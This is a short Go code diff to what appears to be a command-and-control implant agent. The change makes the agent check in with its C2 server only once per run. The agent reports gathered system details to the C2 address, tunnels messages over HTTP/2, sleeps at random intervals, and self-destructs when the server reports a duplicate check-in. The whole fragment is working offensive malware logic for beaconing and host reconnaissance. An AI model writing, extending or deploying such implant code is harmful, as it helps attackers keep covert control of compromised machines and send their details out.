@@ -152,6 +152,7 @@ func agent_main() {
 		time.Sleep(time.Duration(util.RandInt(3, 20)) * time.Second)
 	}
 
+	isCheckedIn := false
 connect:
 	// check preset CC status URL, if CC is supposed to be offline, take a nap
 	if common.RuntimeConfig.CCIndicatorWaitMax > 0 &&
@@ -176,16 +177,23 @@ connect:
 		logging.Println("Not using proxy")
 	}
 
-	logging.Printf("Checking in on %s", def.CCAddress)
-
-	// check in with system info
-	err = c2transport.ReportStatus(agentutils.GatherSystemDetails())
-	if err != nil {
-		logging.Printf("CheckIn error: %v, sleeping, will retry later", err)
-		util.TakeASnap()
-		goto connect
+	if !isCheckedIn {
+		logging.Printf("Checking in on %s", def.CCAddress)
+		// check in with system info
+		err = c2transport.ReportStatus(agentutils.GatherSystemDetails())
+		if err != nil {
+			if strings.Contains(err.Error(), "self-destruct") {
+				logging.Fatalf("Duplicated checkin, self-destructing...")
+			}
+			logging.Printf("CheckIn error: %v, sleeping, will retry later", err)
+			util.TakeASnap()
+			goto connect
+		}
+		logging.Printf("Checked in on CC: %s", def.CCAddress)
+		isCheckedIn = true
+	} else {
+		logging.Printf("Already checked in, skipping registration")
 	}
-	logging.Printf("Checked in on CC: %s", def.CCAddress)
 
 	// connect to MsgAPI, the JSON based h2 tunnel
 	token := uuid.NewString() // dummy token
